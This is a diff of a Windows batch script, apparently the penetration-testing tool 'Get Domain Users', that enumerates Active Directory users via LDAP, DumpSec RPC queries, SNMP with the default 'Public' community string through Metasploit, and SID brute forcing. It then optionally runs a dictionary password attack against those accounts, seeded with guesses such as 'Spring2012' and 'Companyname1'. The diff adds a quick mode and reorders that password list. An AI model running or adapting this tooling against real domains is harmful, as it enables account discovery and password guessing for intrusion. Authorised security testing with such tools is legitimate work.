@@ -6,7 +6,7 @@ REM # Author and Stuff
 REM #################################################################
 REM # Script Name: Get Domain Users (GDU)
 REM # Author: Scott Sutherland (nullbind) <scott.sutherland@netspi.com>
-REM # Version: 1.1
+REM # Version: 1.2
 REM #
 REM # Description:
 REM # This script is intended to automate Windows domain user 
@@ -45,10 +45,10 @@ REM #################################################################
 REM -----------------------------------------------------------------
 REM TODO
 REM -----------------------------------------------------------------
-REM - Add option to list active domain group memeber sessions
-REM - Add option to list active domain user sessions
+REM - Add other authentication methods for sessions enumeration
+REM - Fix each enumeration method so they stop on first success (dumpsec finished, the rest are pending)
+REM - Add fast/comprehensive modes (added by needs testing)
 REM - Add custom dictionary option
-REM - Add fast/comprehensive modes
 REM - Add check for required executables before running
 REM -----------------------------------------------------------------
 
@@ -82,7 +82,7 @@ IF [%1] equ [-t] goto :TRUSTEDCON
 :SYNTAX
 ECHO.
 ECHO  ====================================================================================
-ECHO       GET DOMAIN USERS (GDU) v.1.1 - Author: scott.sutherland@netspi.com (nullbind)
+ECHO       GET DOMAIN USERS (GDU) v.1.2 - Author: scott.sutherland@netspi.com (nullbind)
 ECHO.
 ECHO               https://github.com/nullbind/Other-Projects/tree/master/GDU
 ECHO  ====================================================================================
@@ -137,17 +137,23 @@ GOTO :NULLSESSION
 REM ## CHECK IF USERS WOULD LIKE TO AUTO EXEC A DICTIONARY ATTACK
 ECHO Would you like the dictionary attack to auto execute?
 set /p attack=Y/N (default N):
-IF %attack% equ N GOTO :DHCP
-IF %attack% equ y set attack=Y && GOTO :DHCP
-IF %attack% equ Y GOTO :DHCP
-SET attack=N && GOTO :DHCP
+IF %attack% equ y set attack=Y 
+SET attack=N 
+
+ECHO Would you like to enabled quick mode?
+set /p quickmode=Y/N (default N):
+IF %quickmode% equ N GOTO :DHCP
+IF %quickmode% equ y set attack=Y && GOTO :DHCP
+IF %quickmode% equ Y GOTO :DHCP
+SET quickmode=N && GOTO :DHCP
+
 
 :DHCP
 REM ## DISPLAY BANNER
 cls
 ECHO.
 ECHO  ====================================================================================
-ECHO       GET DOMAIN USERS (GDU) v.1.1 - Author: scott.sutherland@netspi.com (nullbind)
+ECHO       GET DOMAIN USERS (GDU) v.1.2 - Author: scott.sutherland@netspi.com (nullbind)
 ECHO.
 ECHO               https://github.com/nullbind/Other-Projects/tree/master/GDU
 ECHO  ====================================================================================
@@ -320,7 +326,10 @@ IF %user_count% EQU 0 ECHO  [-]  RESULT: FAILED && GOTO :DUMPSEC
 REM ## PRINT NUMBER OF ENUMERATED USERS
 ECHO  [*]  RESULT: Enumerated %user_count%users (domain_users_ldap.txt)
 
-REM ## IF SUCCSESFUL GOTO NEXT STEP
+REM ## QUICK MODE - IF SUCCESSFUL GOTO GRAB POLICY AND DO DICTIONARY ATTACK OR STOP (IF DICTIONARY ATTACK IS DISABLED)
+IF %quickmode% equ Y GOTO :USERCHECK
+
+REM ## IF SUCCSESFUL GOTO USER ENUMERATION TYPE
 GOTO :DUMPSEC
 
 
@@ -330,8 +339,11 @@ REM USER ENUMERATED WITH DUMPSEC (RPC ENDPOINTS)
 REM -------------------------------------------------------
 ECHO  [*]  ACTION: Attempting user enumeration via RPC ENDPOINTS(DUMPSEC)...
 
-REM ## GET LIST OF USERS
-FOR /F "tokens=*" %%i in ('type dcs.txt') do %dumpsecpath% /computer=\\%%i /rpt=usersonly /saveas=csv /outfile=%%i_usrs.txt 2> nul
+REM ## GET LIST OF USERS FROM EVERY DC
+REM FOR /F "tokens=*" %%i in ('type dcs.txt') do %dumpsecpath% /computer=\\%%i /rpt=usersonly /saveas=csv /outfile=%%i_usrs.txt 2> nul
+
+REM ## GET LIST OF USERS FROM EVERY DC  - STOP ON FIRST SUCCESS
+FOR /F "tokens=*" %%i in ('type dcs.txt') do %dumpsecpath% /computer=\\%%i /rpt=usersonly /saveas=csv /outfile=%%i_usrs.txt 2> nul && cat *_usrs.txt| gawk -F "," "{print $1}" | find /V "Somarsoft DumpSec"| find /V "NetQueryDisplayInformation"| find /V "UserName" | grep -v "^$" | grep -v "," | sort | uniq > allusers.txt && wc -l allusers.txt| sed -e "s/^[ \]*//" | sed s/allusers.txt//g>user_count && SET /P user_count=<user_count && IF %user_count% GEQ 10 move allusers.txt domain_users_rpc_dumpsec.txt 2>nul 1>nul && IF EXIST %%i_usrs.txt del %%i_usrs.txt && GOTO :DUMPSECE
 
 REM ## PARSE CLEAN LIST OF USERS
 cat *_usrs.txt| gawk -F "," "{print $1}" | find /V "Somarsoft DumpSec"| find /V "NetQueryDisplayInformation"| find /V "UserName" | grep -v "^$" | grep -v "," | sort | uniq > allusers.txt
@@ -350,10 +362,14 @@ IF EXIST allusers.txt move allusers.txt domain_users_rpc_dumpsec.txt 2>nul 1>nul
 REM ## CHECK FOR FAILURE
 IF %user_count% LEQ 1 ECHO  [-]  RESULT: FAILED && GOTO :ENUMN
 
+:DUMPSECE
 REM ## PRINT NUMBER OF ENUMERATED USERS
 ECHO  [*]  RESULT: Enumerated %user_count%users (domain_users_rpc_dumpsec.txt)
 
-REM ## IF SUCCSESFUL GOTO NEXT STEP
+REM ## QUICK MODE - IF SUCCESSFUL GOTO GRAB POLICY AND DO DICTIONARY ATTACK OR STOP (IF DICTIONARY ATTACK IS DISABLED)
+IF %quickmode% equ Y GOTO :USERCHECK
+
+REM ## IF SUCCSESFUL GOTO USER ENUMERATION TYPE
 GOTO :ENUMN
 
 
@@ -400,7 +416,10 @@ IF %user_count% EQU 0 ECHO  [-]  RESULT: FAILED && GOTO :SNMPENUM
 REM ## PRINT NUMBER OF ENUMERATED USERS
 ECHO  [*]  RESULT: Enumerated %user_count%users (domain_users_rpc_enum.txt) 
 
-REM ## IF SUCCSESFUL GOTO NEXT STEP
+REM ## QUICK MODE - IF SUCCESSFUL GOTO GRAB POLICY AND DO DICTIONARY ATTACK OR STOP (IF DICTIONARY ATTACK IS DISABLED)
+IF %quickmode% equ Y GOTO :USERCHECK
+
+REM ## IF SUCCSESFUL GOTO USER ENUMERATION TYPE
 GOTO :SNMPENUM
 
 
@@ -411,6 +430,7 @@ REM -----------------------------------------------------------------------
 ECHO  [*]  ACTION: Attempting user enumeration via SNMP Public string...
 
 REM ## GET LIST OF USERS
+REM FOR /F "tokens=*" %%i in ('type dcs.txt') do ruby c:\metasploit\msf3\msfcli auxiliary/scanner/snmp/snmp_enumusers COMMUNITY=Public RHOSTS=%%i E 2> nul 1>> usrtmp.txt &&
 ruby c:\metasploit\msf3\msfcli auxiliary/scanner/snmp/snmp_enumusers COMMUNITY=Public RHOSTS=file:%mypwd%\\dcs.txt E 2> nul 1>> usrtmp.txt
 
 REM ## PARSE CLEAN LIST OF USERS
@@ -431,7 +451,10 @@ if %user_count% LEQ 1 ECHO  [-]  RESULT: FAILED && GOTO :SIDENUM
 REM ## PRINT NUMBER OF ENUMERATED USERS
 ECHO  [*]  RESULT: Enumerated %user_count%users (domain_users_snmp.txt) 
 
-REM ## IF SUCCSESFUL GOTO NEXT STEP
+REM ## QUICK MODE - IF SUCCESSFUL GOTO GRAB POLICY AND DO DICTIONARY ATTACK OR STOP (IF DICTIONARY ATTACK IS DISABLED)
+IF %quickmode% equ Y GOTO :USERCHECK
+
+REM ## IF SUCCSESFUL GOTO USER ENUMERATION TYPE
 GOTO :SIDENUM
 
 
@@ -496,7 +519,10 @@ if %user_count% LEQ 1 ECHO  [-]  RESULT: FAILED && GOTO :USERCHECK
 REM ## PRINT NUMBER OF ENUMERATED USERS
 ECHO  [*]  RESULT: Enumerated %user_count%users (domain_users_rpc_sidbf.txt) 
 
-REM ## IF SUCCSESFUL GOTO NEXT STEP
+REM ## QUICK MODE - IF SUCCESSFUL GOTO GRAB POLICY AND DO DICTIONARY ATTACK OR STOP (IF DICTIONARY ATTACK IS DISABLED)
+IF %quickmode% equ Y GOTO :USERCHECK
+
+REM ## IF SUCCSESFUL GOTO USER ENUMERATION TYPE
 GOTO :USERCHECK
 
 
@@ -594,13 +620,12 @@ REM ##       but mainly its rocku.  Also, blank and username as pass
 REM ##       will be done via the smb_login module.
 IF EXIST list_pending.txt DEL list_pending.txt
 touch list_pending.txt
+ECHO Spring2012>> list_pending.txt
+ECHO Winter2012>> list_pending.txt
+ECHO Sportsteam12>> list_pending.txt
 ECHO companyname>> list_pending.txt
 ECHO Companyname>> list_pending.txt
 ECHO Summer2012>> list_pending.txt
-ECHO Fall2011>> list_pending.txt
-ECHO Winter2011>> list_pending.txt
-ECHO Winter2012>> list_pending.txt
-ECHO Spring2012>> list_pending.txt
 ECHO Companyname1>> list_pending.txt
 ECHO companyname1>> list_pending.txt
 EcHO Companyname12>> list_pending.txt
